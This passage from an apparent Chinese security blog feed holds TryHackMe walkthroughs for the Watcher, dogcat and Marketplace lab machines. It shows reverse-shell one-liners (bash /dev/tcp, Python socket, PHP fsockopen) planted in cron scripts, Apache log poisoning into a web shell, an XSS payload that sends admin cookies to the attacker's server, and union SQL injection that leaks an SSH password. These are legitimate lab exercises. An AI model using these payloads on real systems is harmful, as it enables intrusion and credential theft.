alt="image-20241021134710659"></p><p>通过ftp上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134741144-1604384591.png" alt="image-20241021134723674"></p><p>此时文件的绝对路径就是<code>/home/ftpuser/ftp/files/info.php</code></p><p>再通过浏览器读取该文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134838040-1001287900.png" alt="image-20241021134820399"></p><p>成功读取，同时php代码也可以被解析，可以利用这个进行反弹shell</p><p>准备好我们的<a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">webshell</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135028115-2037447420.png" alt="image-20241021135010474"></p><p>设置好ip和port</p><p>将文件通过ftp上传到服务器上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135329563-557176968.png" alt="image-20241021135312126"></p><p>攻击机设置好监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135347617-1267050085.png" alt="image-20241021135330242"></p><p>浏览器读取并访问我们的shell文件</p><p><code>/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135440557-392731814.png" alt="image-20241021135423056"></p><p>拿到shell</p><h1 id="主机用户信息收集"><a href="#主机用户信息收集" class="headerlink" title="主机用户信息收集"></a>主机用户信息收集</h1><p>我们已经获得了<code>www-data</code>权限，能够简单的访问服务器资源，我们需要更进一步的控制这台服务器，就需要继续提升我们的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135929107-235560157.png" alt="image-20241021135911555"></p><p>在<code>/home/mat</code>下，找到flag5，但是权限不够无法访问，但是可以查看<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140040335-1570935829.png" alt="image-20241021140022894"></p><p>发现可以使用脚本执行，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140152087-852207533.png" alt="image-20241021140134588"></p><p>先切换到交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>发现该文件只提供了三个可以执行的命令，因为文件所属权不属于当前用户，所以无法更改，看下其他用户目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140642766-1756489674.png" alt="image-20241021140625275"></p><p>还有个<code>note.txt</code>，查看一下，<code>flag4</code>还是没权限查看，同时还注意到有个<code>jobs</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141248050-1048480932.png" alt="image-20241021141230381"></p><p>看样子是想提醒我们查看<code>jobs</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141331204-1164871302.png" alt="image-20241021141313651"></p><p>这是一个脚本文件，里面有cat命令</p><p>继续查看最后一个用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141428606-130895387.png" alt="image-20241021141411017"></p><p>这里只有flag6，仍然无权限读取</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141806989-1106969102.png" alt="image-20241021141749594"></p><p>在web目录下找到flag3</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><h2 id="提升至toby权限"><a href="#提升至toby权限" class="headerlink" title="提升至toby权限"></a>提升至toby权限</h2><p>先检查下<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144652253-1150780171.png" alt="image-20241021144634735"></p><p>发现可以使用<code>toby</code>执行任何命令<code>sudo</code>无需密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144827096-1301873310.png" alt="image-20241021144809623"></p><p>获取<code>toby</code>用户权限，并拿到flag4</p><h2 id="横移至mat权限"><a href="#横移至mat权限" class="headerlink" title="横移至mat权限"></a>横移至mat权限</h2><p>结合之前的信息可知toby的<code>jobs</code>目录中<code>cow.sh</code>是mat的，而我们可以修改该文件，所以我们可以通过写反弹shell获取mat的权限</p><p>攻击机先设置监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145651665-600001604.png" alt="image-20241021145634230"></p><p>在靶机中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; cow.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145821073-1468765908.png" alt="image-20241021145803589"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150121987-290344974.png" alt="image-20241021150104300"></p><p>过一会等定时任务触发，就拿到了mat的shell，并在当前目录找到flag5</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150554982-1695743786.png" alt="image-20241021150537504"></p><h2 id="横移至will权限"><a href="#横移至will权限" class="headerlink" title="横移至will权限"></a>横移至will权限</h2><p>现在已经拿到了mat的权限，查看一下<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151156011-979402750.png" alt="image-20241021151138536"></p><p>发现我们可以不用密码执行<code>will</code>权限的<code>python3</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151729954-690550907.png" alt="image-20241021151707919"></p><p>结合之前分析的结果可知，我们有权修改<code>cmd.py</code>，无权更改<code>will_script.py</code>，但是<code>will_script.py</code>会调用<code>cmd.py</code>，所以我们就可以通过修改<code>cmd.py</code>的内容，在其中写上反弹shell的python代码，使用<code>will</code>权限的<code>python3</code>执行<code>will_script.py</code>，我们就获得了<code>will</code>的shell</p><p>先在kali上设置监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152055316-382361973.png" alt="image-20241021152037707"></p><p>在靶机上写入python代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.14.90.122&quot;,8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt;&gt; cmd.py</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152258357-765071767.png" alt="image-20241021152240564"></p><p>执行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152345593-107476696.png" alt="image-20241021152328180"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152358318-1138667333.png" alt="image-20241021152340822"></p><p>获得will的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152454277-1738449844.png" alt="image-20241021152436836"></p><p>找到flag6</p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>使用will继续查找敏感文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152856987-194567056.png" alt="image-20241021152839278"></p><p>在<code>/opt/backups</code>下找到了经过<code>base64</code>编码的key</p><p>将其保存到文件<code>base64_key</code>解码查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153053351-1239828122.png" alt="image-20241021153035699"></p><p>发现是一组私钥，猜测是root的，将私钥保存到文件<code>id_rsa</code>，并赋予<code>600</code>权限便于ssh连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.10.76.81 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153454825-905657572.png" alt="image-20241021153436661"></p><p>获得root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153518635-300441644.png" alt="image-20241021153501169"></p><p>在当前目录找到最后一个flag7</p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Watcher</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-dogcat</title>
    <link href="https://ya1orin.github.io/posts/652498eb.html"/>
    <id>https://ya1orin.github.io/posts/652498eb.html</id>
    <published>2024-10-18T06:52:51.000Z</published>
    <updated>2024-11-13T05:19:38.098Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.89.86</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.89.86</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160045039-313432027.png" alt="image-20241018160031179"></p><p>发现开放22，80端口</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018152418808-1060650834.png" alt="image-20241018152404974"></p><p>发现点击dog或者cat，会显示一张相应的图片</p><p>先扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.89.86/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160059374-298481108.png" alt="image-20241018160045419"></p><p>访问<code>/cats</code>显示403，除此之外并没有什么有用的信息</p><h1 id="LIF导致RCE"><a href="#LIF导致RCE" class="headerlink" title="LIF导致RCE"></a>LIF导致RCE</h1><p>再次查看我们的页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161701177-2088714964.png" alt="image-20241018161647388"></p><p>在url处有个参数view，尝试一下目录穿越</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161810480-951159654.png" alt="image-20241018161756644"></p><p>有效果，可以文件包含，并且默认在后面加<code>.php</code>文件后缀了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161932049-1336654229.png" alt="image-20241018161918408"></p><p>测试后发现可以通过<code>%00</code>可以截断</p><p>使用伪协议尝试读取源码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162225948-1416006650.png" alt="image-20241018162212286"></p><p>base64解码一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162330439-314328065.png" alt="image-20241018162316656"></p><p>尝试读取一下别的文件</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog/../index</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162600495-2121576637.png" alt="image-20241018162546442"></p><p>发现解码后的代码，我们还可以控制<code>ext</code>变量，来控制文件后缀，所以我们就可以读取任意文件了</p><p>先读取<code>/etc/passwd</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../etc/passwd&amp;ext=</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162851221-1049120622.png" alt="image-20241018162837485"></p><p>看源码比较清晰一点</p><p>这里貌似没什么信息，查看一下日志</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=</span><br></pre></td></tr></table></figure><p>最终找到了<code>apache2</code>的日志</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163529321-1675570605.png" alt="image-20241018163515318"></p><p>在最后发现我们的操作会被记录下来，并且请求头的信息也保存了</p><p>尝试更改请求头试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163851053-760002723.png" alt="image-20241018163836959"></p><p>我们自定义的请求头被写入到日志文件中了，尝试写入php代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164041488-425159992.png" alt="image-20241018164027252"></p><p>成功RCE！</p><h1 id="获得初始访问权限"><a href="#获得初始访问权限" class="headerlink" title="获得初始访问权限"></a>获得初始访问权限</h1><p>先将RCE完善一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(\$_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018165138954-1219496020.png" alt="image-20241018165124697"></p><p>可以执行命令，我们就尝试反弹shell，先建立个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164149123-438306846.png" alt="image-20241018164135561"></p><p>执行一下反弹shell命令（注意要url编码）</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;10.14.90.122&quot;</span>, <span class="number">8888</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181125748-1188823251.png" alt="image-20241018181111610"></p><p>成功获取初始权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181201855-1454053211.png" alt="image-20241018181148117"></p><p>在当前页面找到<code>flag.php</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>先找一下flag的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181620922-1758860058.png" alt="image-20241018181607197"></p><p>找到flag2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181644383-1741156501.png" alt="image-20241018181630748"></p><p><code>sudo -l</code>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183042873-653679545.png" alt="image-20241018183028748"></p><p>发现<code>env</code>命令具有root权限，使用<code>env</code>命令提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183104360-4899350.png" alt="image-20241018183050727"></p><p>获得root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183127751-2047869555.png" alt="image-20241018183114104"></p><p>在<code>/root</code>下找到<code>flag3.txt</code></p><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p>在根目录中找到<code>.dockerenv</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185123618-1506946845.png" alt="image-20241018185109777"></p><p>可知我们在docker内</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185222092-292349124.png" alt="image-20241018185208376"></p><p>仔细翻找文件后发现以上内容，仔细查看一下，发现像是备份文件的命令，过段时间后会发现<code>backup.tar</code>文件的修改时间改变了，推断出可能正在执行一个<code>cron</code>任务</p><p>我们可以尝试写入反弹shell的命令，并以主机上的 root 身份获取 shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; backup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018190855406-938924442.png" alt="image-20241018190841293">主机进行监听，过段时间后我们获取到了主机的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191712386-1712812147.png" alt="image-20241018191658563"></p><p>成功获取主机shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191743754-679623711.png" alt="image-20241018191730005"></p><p>在<code>/root</code>目录找到最后一个flag</p>]]></content>
    
    
    <summary type="html">TryHackMe系列之dogcat</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-The Marketplace</title>
    <link href="https://ya1orin.github.io/posts/aad874a7.html"/>
    <id>https://ya1orin.github.io/posts/aad874a7.html</id>
    <published>2024-10-17T07:31:23.000Z</published>
    <updated>2024-11-13T05:19:34.666Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.113.205</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -min-rate 10000 -A -sV -sC -p- 10.10.113.205</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154217241-1022693500.png" alt="image-20241017154202881"></p><p>发现有22，80，32768端口开放</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154322531-882372758.png" alt="image-20241017154309971"></p><p>先扫描目录</p><p><code>gobuster dir -u http://10.10.113.205/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154759524-796732244.png" alt="image-20241017154746973"></p><p>先创建一个普通用户查看一下相关路径，得到以下结果：</p><ul><li><code>/admin</code> 需要登录认证才能查看</li><li><code>/signup</code> 注册</li><li><code>/login</code> 登录</li><li><code>/new</code> 创建一个新列表</li><li><code>/messages</code> 查看消息</li><li><code>/contact/michael</code> 联系列表作者</li><li><code>/item/1</code> 查看具体列表的详细信息</li><li><code>/report/1</code> 向管理员报告列表</li></ul><h1 id="XSS钓鱼越权"><a href="#XSS钓鱼越权" class="headerlink" title="XSS钓鱼越权"></a>XSS钓鱼越权</h1><p>测试后发现在创建新列表的时候，<code>Description</code>的值存在存储型xss</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160338454-1233589541.png" alt="image-20241017160325926"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160357257-693709284.png" alt="image-20241017160344536"></p><p>可以利用xss得到cookie等关键信息</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160619411-1869855713.png" alt="image-20241017160607215"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160525019-1199388518.png" alt="image-20241017160512805"></p><p>发现cookie的格式像是jwt，可以使用<a href="https://jwt.io/">在线工具</a>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017161223991-2004112504.png" alt="image-20241017161211306"></p><p>想尝试将cookie伪造成admin，但是失败了</p><p>我们的商品存在存储型XSS漏洞，那么我们可以在我们的商品页面作为钓鱼页面，举报自己的商品诱导管理员审核，然后得到管理员的Cookie，提取他的Token</p><ul><li>首先，建立监听用于获取cookie</li></ul><p><code>python -m http.server</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162043360-56155628.png" alt="image-20241017162030691"></p><ul><li>然后构造XSS钓鱼页面，当有人访问的时候获取他的cookie</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="variable language_">this</span>.<span class="property">src</span>=<span class="string">&quot;http://10.14.90.122:8000/?1=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code> 用于加载图像。</p><p><code>src=x</code> 设置一个无效的图像源，通常会导致加载失败。</p><p><code>onerror</code> 当图像加载失败时触发的事件。</p><p><code>this.src</code> 在图像加载失败时，将图像的 <code>src</code> 属性设置为一个 URL，即为我们构造的一个新的URL将当前页面的 cookies 作为查询参数添加到该 URL 中</p><p><code>document.cookie</code> 获取当前页面的 cookies</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162252922-660876351.png" alt="image-20241017162240509"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162337370-966054914.png" alt="image-20241017162324966"></p><p>这时我们会收到大量的cookie，现在举报商品</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162452408-1679239075.png" alt="image-20241017162440113"></p><p>发现有几条不一样的，分析一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162542667-494681323.png" alt="image-20241017162530429"></p><p>发现是admin的cookie，更换cookie</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162715518-1364164542.png" alt="image-20241017162703243"></p><p>更换后刷新页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162747921-460184614.png" alt="image-20241017162735330"></p><p>发现多了个<code>Administrator panel</code>，现在已经成功越权到admin了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162826902-308858830.png" alt="image-20241017162814445"></p><p>点击后获得flag</p><h1 id="SQL注入拿shell"><a href="#SQL注入拿shell" class="headerlink" title="SQL注入拿shell"></a>SQL注入拿shell</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163022484-117763262.png" alt="image-20241017163010291"></p><p>随便点击一个用户发现是通过get传参，<code>user</code>是参数进行查询的，判断一下是否有sql注入</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163149364-625326231.png" alt="image-20241017163137167"></p><p>可以注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163317723-1348407264.png" alt="image-20241017163305552"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163417336-620897975.png" alt="image-20241017163404953"></p><p>判断出字段数是4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163452909-662759722.png" alt="image-20241017163440726"></p><p>发现回显位置有1和2</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163650303-2129390896.png" alt="image-20241017163637823"></p><p>找到数据库名<code>marketplace</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163725041-1630260119.png" alt="image-20241017163712870"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;messages&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163755877-1253692693.png" alt="image-20241017163743652"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> concat_ws(<span class="string">&#x27;,&#x27;</span>,id,is_read,message_content,user_from,user_to),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> marketplace.messages limit <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163858140-647301558.png" alt="image-20241017163845970"></p><p>找到了<code>jake</code>用户的ssh密码<code>@b_ENXkGYUCAv3zJ</code></p><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jake@10.10.113.205</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164154918-51511059.png" alt="image-20241017164142284"></p><p>登陆成功</p><p><img 